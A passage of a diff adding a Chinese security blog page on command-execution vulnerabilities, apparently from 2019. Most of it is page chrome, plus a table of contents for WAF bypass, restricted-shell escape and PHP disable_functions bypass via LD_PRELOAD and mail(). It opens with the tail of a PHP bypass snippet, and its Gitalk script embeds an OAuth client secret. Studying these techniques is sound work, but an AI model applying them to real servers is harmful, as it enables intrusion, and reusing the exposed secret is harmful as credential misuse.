<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>转自：</p>
+<p><a href="https://www.freebuf.com/articles/web/185158.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/185158.html</a></p>
+<p><a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/188989.html</a></p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=48303&amp;extra=&amp;page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=48303&amp;extra=&amp;page=1</a></p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=49115&amp;highlight=disable%5C_function" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=49115&amp;highlight=disable%5C_function</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-16054.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-16054.html</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/13/2019-1-13-命令执行/" title="命令执行漏洞进阶详解">https://wh0ale.github.io/2019/01/13/2019-1-13-命令执行/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/命令执行/" rel="tag"><i class="fa fa-tag"></i># 命令执行</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/12/2019-1-12-ImageMagick安全详解/" rel="next" title="ImageMagick安全详解">
+                <i class="fa fa-chevron-left"></i> ImageMagick安全详解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/13/2019-1-13-上传漏洞/" rel="prev" title="上传漏洞">
+                上传漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-php相关函数"><span class="nav-number">1.</span> <span class="nav-text">0x01 php相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、代码执行"><span class="nav-number">1.1.</span> <span class="nav-text">一、代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval"><span class="nav-number">1.1.1.</span> <span class="nav-text">eval()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#assert"><span class="nav-number">1.1.2.</span> <span class="nav-text">assert()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-replace"><span class="nav-number">1.1.3.</span> <span class="nav-text">preg_replace</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func"><span class="nav-number">1.1.4.</span> <span class="nav-text">call_user_func()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func-array"><span class="nav-number">1.1.5.</span> <span class="nav-text">call_user_func_array()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#create-function"><span class="nav-number">1.1.6.</span> <span class="nav-text">create_function</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#array-map"><span class="nav-number">1.1.7.</span> <span class="nav-text">array_map()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、系统命令执行"><span class="nav-number">1.2.</span> <span class="nav-text">二、系统命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#system"><span class="nav-number">1.2.1.</span> <span class="nav-text">system()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#passthru"><span class="nav-number">1.2.2.</span> <span class="nav-text">passthru()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exec"><span class="nav-number">1.2.3.</span> <span class="nav-text">exec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pcntl-exec"><span class="nav-number">1.2.4.</span> <span class="nav-text">pcntl_exec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell-exec"><span class="nav-number">1.2.5.</span> <span class="nav-text">shell_exec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#popen"><span class="nav-number">1.2.6.</span> <span class="nav-text">popen()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-open"><span class="nav-number">1.2.7.</span> <span class="nav-text">proc_open()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反单引号"><span class="nav-number">1.2.8.</span> <span class="nav-text">`(反单引号)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ob-start"><span class="nav-number">1.2.9.</span> <span class="nav-text">ob_start()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-mail"><span class="nav-number">1.2.10.</span> <span class="nav-text">php mail()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-命令执行WAF绕过技巧总结"><span class="nav-number">2.</span> <span class="nav-text">0x02 命令执行WAF绕过技巧总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#技巧一：通配符"><span class="nav-number">2.1.</span> <span class="nav-text">技巧一：通配符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#技巧二：连接符"><span class="nav-number">2.2.</span> <span class="nav-text">技巧二：连接符</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取shell"><span class="nav-number">2.2.1.</span> <span class="nav-text">获取shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#技巧三：未初始化的bash变量"><span class="nav-number">2.3.</span> <span class="nav-text">技巧三：未初始化的bash变量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试WAF"><span class="nav-number">2.3.1.</span> <span class="nav-text">测试WAF</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">2.4.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-Linux-Restricted-Shell绕过技巧总结"><span class="nav-number">3.</span> <span class="nav-text">0x03 Linux Restricted Shell绕过技巧总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、什么是Restricted-Shell"><span class="nav-number">3.1.</span> <span class="nav-text">一、什么是Restricted Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#如何设置一个Restricted-Shell"><span class="nav-number">3.1.1.</span> <span class="nav-text">如何设置一个Restricted Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、枚举Linux环境"><span class="nav-number">3.2.</span> <span class="nav-text">二、枚举Linux环境</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令"><span class="nav-number">3.2.1.</span> <span class="nav-text">命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编程语言"><span class="nav-number">3.2.2.</span> <span class="nav-text">编程语言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检查环境变量"><span class="nav-number">3.2.3.</span> <span class="nav-text">检查环境变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、常见利用技术"><span class="nav-number">3.3.</span> <span class="nav-text">三、常见利用技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#“-”字符被允许"><span class="nav-number">3.3.1.</span> <span class="nav-text">“/”字符被允许</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cp命令被允许"><span class="nav-number">3.3.2.</span> <span class="nav-text">cp命令被允许</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见应用"><span class="nav-number">3.3.3.</span> <span class="nav-text">常见应用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#set-shell"><span class="nav-number">3.3.4.</span> <span class="nav-text">set shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#更改PATH或SHELL环境变量"><span class="nav-number">3.3.5.</span> <span class="nav-text">更改PATH或SHELL环境变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编程语言-1"><span class="nav-number">3.3.6.</span> <span class="nav-text">编程语言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#最新技术"><span class="nav-number">3.3.7.</span> <span class="nav-text">最新技术</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、实战操作"><span class="nav-number">3.4.</span> <span class="nav-text">四、实战操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、总结"><span class="nav-number">3.5.</span> <span class="nav-text">五、总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-实战"><span class="nav-number">3.6.</span> <span class="nav-text">0x04 实战</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一、利用环境变量LD-PRELOAD来绕过php-disable-function执行系统命令"><span class="nav-number">3.7.</span> <span class="nav-text">一、利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-前言"><span class="nav-number">3.7.1.</span> <span class="nav-text">1. 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-绕过思路"><span class="nav-number">3.7.2.</span> <span class="nav-text">2. 绕过思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-LD-PRELOAD-hack"><span class="nav-number">3.7.3.</span> <span class="nav-text">3. LD_PRELOAD hack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-实战测试"><span class="nav-number">3.7.4.</span> <span class="nav-text">4.实战测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-小结"><span class="nav-number">3.7.5.</span> <span class="nav-text">5. 小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、-利用mail-bypass-disable-function-执行命令"><span class="nav-number">3.8.</span> <span class="nav-text">二、 利用mail bypass disable_function 执行命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、无-sendmail-环境下突破-disable-functions-执行命令"><span class="nav-number">3.9.</span> <span class="nav-text">三、无 sendmail 环境下突破 disable_functions 执行命令</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
